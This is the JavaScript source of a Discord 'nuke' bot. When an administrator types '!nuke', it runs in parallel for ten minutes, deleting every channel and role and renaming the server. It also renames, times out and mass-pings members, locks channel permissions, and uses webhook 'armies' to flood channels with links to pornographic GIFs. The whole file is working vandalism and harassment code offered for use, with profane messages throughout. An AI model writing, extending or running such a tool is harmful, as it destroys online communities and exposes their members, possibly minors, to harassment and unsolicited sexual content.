require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';

const NUKE_DURATION = 10 * 60 * 1000;
const TICK_INTERVAL = 5 * 10; // aggressive speed
let nukeActive = true;
let nukeTimeout = false;

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
  'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO',
  'MULTI TASK', 'PARALLEL CHAOS', 'AGGRESSIVE MODE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
  'Boss Marked', 'Rage', 'Aggro', 'Doomed', 'Parallel', 'Pressure'
];

const MESSAGES = [
  '**AGGRESSIVE MULTI-TASK**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
  
  
  'MUTED', 'SILENCE', 'NO ESCAPE', 'ARMY OVERWHELM', 'BOSS RAGE',`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,`@everyone`,
  `@everyone`,
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro'
];

const ARMY_MESSAGES = [
  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
  'no survivors', 'mute activated', 'gif spam', 'reality break',
  'webhook army', 'too many of us', 'flooding now', 'we are many',
  'no hope', 'collapse', 'army online', 'boss is raging', 'full aggro',
  'multi tasking', 'parallel chaos', 'aggressive mode'
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'Webhook Army',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('AGGRESSIVE MULTI-TASK').catch(() => {});
}

// ================== BOSS ACTIONS (Aggressive) ==================
const bossActions = [
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    await Promise.all(channels.map(ch => safeDelete(ch)));
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 12; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        }).then(ch => ch.send(randomItem(MESSAGES)).catch(() => {})).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 7; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'rage', 'aggro', 'multi', 'kill']),
          type: ChannelType.GuildText,
        }).then(async ch => {
          await ch.send('👁').catch(() => {});
          setTimeout(() => ch.delete().catch(() => {}), 2000 + Math.random() * 3000);
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    await Promise.all(
      roles
        .filter(r => r.id !== guild.id && r.editable)
        .map(r => r.delete('AGGRESSIVE MULTI-TASK').catch(() => {}))
    );
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 10; i++) {
      tasks.push(
        guild.roles.create({
          name: randomItem(ROLE_NAMES),
          color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
          reason: 'AGGRESSIVE MULTI-TASK',
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
    );
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.moderatable)
        .map(m => {
          const time = [900, 1800, 3600, 7200, 14400][Math.floor(Math.random() * 5)] * 1000;
          return m.timeout(time, 'AGGRESSIVE MULTI-TASK').catch(() => {});
        })
    );
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < 6; i++) {
        tasks.push(channel.send(randomItem(MESSAGES)).catch(() => {}));
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    await Promise.all(
      [...channels.values()].map(channel =>
        channel.permissionOverwrites.edit(guild.roles.everyone, {
          ViewChannel: chance(8),
          SendMessages: false,
          Connect: false,
          Speak: false,
          AddReactions: false,
          AttachFiles: false,
          EmbedLinks: false,
        }).catch(() => {})
      )
    );
  },

  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      'AGGRESSIVE MULTI-TASK', 'PARALLEL CHAOS', 'BOSS RAGE',
      'ARMY COMMANDER', 'OVERLORD', 'THE DESTROYER', 'FULL AGGRO'
    ])).catch(() => {});
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || roles.length === 0) return;

    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => {
          const role = randomItem(roles);
          return role ? m.roles.add(role).catch(() => {}) : Promise.resolve();
        })
    );
  },
];

// ================== WEBHOOK ARMY (Aggressive + Parallel) ==================
const armyActions = [
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const tasks = [];
    for (const channel of channels.values()) {
      for (const name of ARMY_NAMES.slice(0, 9)) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, name);
          if (!webhook) return;
          for (let i = 0; i < 3; i++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        })());
      }
    }
    await Promise.all(tasks);
    console.log('👾 AGGRESSIVE ARMY GIF WAVE');
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < 6; i++) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
          if (!webhook) return;
          await webhook.send({
            content: randomItem(ARMY_MESSAGES),
            username: randomItem(ARMY_NAMES),
          }).catch(() => {});
        })());
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 5; i++) {
      tasks.push((async () => {
        try {
          const ch = await guild.channels.create({
            name: randomItem(['army-spam', 'multi-wave', 'flood-zone', 'aggro', 'parallel']),
            type: ChannelType.GuildText,
          });
          for (const name of ARMY_NAMES.slice(0, 4)) {
            const webhook = await getOrCreateWebhook(ch, name);
            if (!webhook) continue;
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        } catch (e) {}
      })());
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    const tasks = [];
    for (const channel of channels.values()) {
      tasks.push((async () => {
        const webhook = await getOrCreateWebhook(channel, 'Glitch');
        if (!webhook) return;
        await webhook.send({
          content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸']),
          username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
        }).catch(() => {});
      })());
    }
    await Promise.all(tasks);
  },
];

// ================== MULTI-TASK TICK ==================
async function runNukeTick(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== AGGRESSIVE MULTI-TASK TICK on ${guild.name} ========`);

  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 9);
  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 4);

  // Everything runs at the same time
  await Promise.all([
    ...selectedBoss.map(action => action(guild).catch(err => console.error('❌ Boss:', err.message))),
    ...selectedArmy.map(action => action(guild).catch(err => console.error('❌ Army:', err.message))),
  ]);

  console.log('✅ Aggressive multi-task tick complete');
}

// ================== START / STOP ==================
async function startNuke(guild, message) {
  if (nukeActive) {
    if (message) await message.reply('FUCK YEA IM STILL RUNNING');
    
  }

  nukeActive = true;
  if (message) await message.reply('💣 **AGGRESSIVE MULTI-TASK NUKE STARTED**\nBoss + Armies hitting in parallel.');

  console.log('💣 AGGRESSIVE MULTI-TASK NUKE STARTED');

  await runNukeTick(guild);

  const interval = setInterval(async () => {
    if (!nukeActive) return clearInterval(interval);
    await runNukeTick(guild);
  }, TICK_INTERVAL);

  nukeTimeout = setTimeout(() => {
    nukeActive = false;
    clearInterval(interval);
    console.log('🛑 AGGRESSIVE MULTI-TASK NUKE ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 AGGRESSIVE MULTI-TASK NUKE BOT READY`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await startNuke(message.guild, message);
  }

  if (message.content === '!nuke-stop') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped.');
  }
});

client.login(TOKEN);
